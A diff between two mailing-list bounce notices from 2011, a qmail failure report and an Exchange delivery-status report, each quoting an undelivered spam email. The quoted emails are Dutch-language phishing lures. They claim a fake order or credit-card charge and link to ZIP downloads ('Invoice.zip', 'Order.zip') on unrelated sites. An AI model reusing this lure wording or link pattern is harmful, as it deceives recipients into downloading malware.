@@ -1,11 +1,13 @@
-From: MAILER-DAEMON-M2OIlR50P4yJvDsE/pi2kKxOck334EZe@public.gmane.org
-Subject: failure notice
-Date: 15 Nov 2011 00:58:16 -0600
-Message-ID: <20111115070336.A23FC3CE@mail.linuxfoundation.org>
+From: <postmaster-G+Vgi4iE+l8bIzgrwE/FjQ@public.gmane.org>
+Subject: Undeliverable: SPAM: Your order has been accepted.
+Date: Tue, 15 Nov 2011 08:16:01 +0100
+Message-ID: <14274.8347869658$1321341706@news.gmane.org>
+References: <398534523.20931281730474@uspro545.startdedicated.com>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============6184093095129682863=="
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Content-Language: en-US
+In-Reply-To: <398534523.20931281730474-QHT31ff7oBgJ6fTLyRp1Vlc0O+juaISAQQ4Iyu8u01E@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
 List-Archive: <http://lists.linuxfoundation.org/pipermail/containers/>
@@ -18,45 +20,123 @@ Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public
 To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-Hi. This is the qmail-send program at dj2.dowhosting.net.
-I'm afraid I wasn't able to deliver your message to the following addresses.
-This is a permanent error; I've given up. Sorry it didn't work out.
+--===============6184093095129682863==
+Content-Type: multipart/report; report-type=delivery-status;
+	boundary="49a74142-dcd8-49e9-9f14-3ddde8173930"
+Content-Language: en-US
 
-<appartementelsbeemtem.beemt-CmkmPbn3yAE@public.gmane.org>:
-212.54.42.8 does not like recipient.
-Remote host said: 550 Unrouteable address
-Giving up on 212.54.42.8.
+--49a74142-dcd8-49e9-9f14-3ddde8173930
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: quoted-printable
 
---- Below this line is a copy of the message.
+Delivery has failed to these recipients or distribution lists:
 
-Return-Path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-Received: (qmail 1702 invoked from network); 15 Nov 2011 00:58:08 -0600
-Received: from uspro545.startdedicated.com (173.224.125.98)
-  by dj2.dowhosting.net with SMTP; 15 Nov 2011 00:58:08 -0600
-Received: from [173.224.125.98] by uspro545.startdedicated.com id WiPRfEZHJWpf with SMTP; Tue, 15 Nov 2011 06:58:07 +0000
-Date: Tue, 15 Nov 2011 06:58:07 +0000
-From: "Billing" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-X-Mailer: The Bat! (v4.8.91.8) Home
+arjan.koudijs-BCtglQhd/FA@public.gmane.org<mailto:arjan.koudijs-BCtglQhd/FA@public.gmane.org>
+The recipient's e-mail address was not found in the recipient's e-mail syst=
+em. Microsoft Exchange will not try to redeliver this message for you. Plea=
+se check the e-mail address and try resending this message, or provide the =
+following diagnostic text to your system administrator.
+
+________________________________
+Sent by Microsoft Exchange Server 2007
+
+
+
+
+
+
+Diagnostic information for administrators:
+
+Generating server: ZRT.LOCAL
+
+arjan.koudijs-BCtglQhd/FA@public.gmane.org
+#550 5.1.1 RESOLVER.ADR.RecipNotFound; not found ##
+
+Original message headers:
+
+Received: from uspro545.startdedicated.com (173.224.125.98) by mail.zrt.nl
+ (172.16.3.201) with Microsoft SMTP Server id 8.1.358.0; Tue, 15 Nov 2011
+ 08:16:01 +0100
+Received: from [173.224.125.98] by uspro545.startdedicated.com id
+        4AIUzSTqgPOP with SMTP; Tue, 15 Nov 2011 07:15:59 +0000
+Date: Tue, 15 Nov 2011 07:15:59 +0000
+From: Robot <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+X-Mailer: The Bat! (v2.08.4) Personal
 X-Priority: 3 (Normal)
-Message-ID: <1588210665.40884410745503-QHT31ff7oBgJ6fTLyRp1Vlc0O+juaISAQQ4Iyu8u01E@public.gmane.org>
-To: <appartementelsbeemtem.beemt-CmkmPbn3yAE@public.gmane.org>
-Subject: Your order has been accepted
+Message-ID: <398534523.20931281730474-QHT31ff7oBgJ6fTLyRp1Vlc0O+juaISAQQ4Iyu8u01E@public.gmane.org>
+To: <arjan.koudijs-BCtglQhd/FA@public.gmane.org>
+Subject: SPAM: Your order has been accepted.
 MIME-Version: 1.0
-Content-Type: text/plain;
-	charset="windows-1252"
+Content-Type: text/plain; charset=3D"windows-1252"
 Content-Transfer-Encoding: 8bit
+X-TM-AS-Product-Ver: CSC-0-6.8.1017-18520
+X-TM-AS-Result: Yes-8.23-4.50-31-1
+Return-Path: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+
+
+--49a74142-dcd8-49e9-9f14-3ddde8173930
+Content-Type: message/delivery-status
+
+Reporting-MTA: dns;ZRT.LOCAL
+Received-From-MTA: dns;uspro545.startdedicated.com
+Arrival-Date: Tue, 15 Nov 2011 07:16:01 +0000
+
+Final-Recipient: rfc822;arjan.koudijs-BCtglQhd/FA@public.gmane.org
+Action: failed
+Status: 5.1.1
+Diagnostic-Code: smtp;550 5.1.1 RESOLVER.ADR.RecipNotFound; not found
+
+
+--49a74142-dcd8-49e9-9f14-3ddde8173930
+Content-Type: message/rfc822
+
+Received: from uspro545.startdedicated.com (173.224.125.98) by mail.zrt.nl
+ (172.16.3.201) with Microsoft SMTP Server id 8.1.358.0; Tue, 15 Nov 2011
+ 08:16:01 +0100
+Received: from [173.224.125.98] by uspro545.startdedicated.com id
+ 	4AIUzSTqgPOP with SMTP; Tue, 15 Nov 2011 07:15:59 +0000
+Date: Tue, 15 Nov 2011 07:15:59 +0000
+From: Robot <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+X-Mailer: The Bat! (v2.08.4) Personal
+X-Priority: 3 (Normal)
+Message-ID: <398534523.20931281730474-QHT31ff7oBgJ6fTLyRp1Vlc0O+juaISAQQ4Iyu8u01E@public.gmane.org>
+To: <arjan.koudijs-BCtglQhd/FA@public.gmane.org>
+Subject: SPAM: Your order has been accepted.
+MIME-Version: 1.0
+Content-Type: text/plain; charset="windows-1252"
+Content-Transfer-Encoding: quoted-printable
+X-TM-AS-Product-Ver: CSC-0-6.8.1017-18520
+X-TM-AS-Result: Yes-8.23-4.50-31-1
+Return-Path: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 
 
 
 
-Dear client, 
+Goeie morgen.
+
+Dank u voor de bestelling,
+uw creditcard in rekening gebracht voor 278 dollar.
+Voor meer informatie kunt u terecht op onze website:
+http://littlema.com/clientedown/Order.zip?id:052047383Generation_user=3Darj=
+an.koudijs-BCtglQhd/FA@public.gmane.org
+
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D
+Best regards, ticket service.
+Tel./Fax.: +31 (30) 392-24-15.
 
 
-Sorry voor de vertraging.
-Werk uw accountgegevens.
-http://biosbalance.gr/clientedown/Invoice.zip?id:60928849Generation_user=appartementelsbeemtem.beemt-CmkmPbn3yAE@public.gmane.org
 
+--49a74142-dcd8-49e9-9f14-3ddde8173930--
 
-==
-Best regards,
-Tel./Fax.: +31 (30) 631-49-94
+--===============6184093095129682863==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
+_______________________________________________
+Containers mailing list
+Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+https://lists.linuxfoundation.org/mailman/listinfo/containers
+--===============6184093095129682863==--
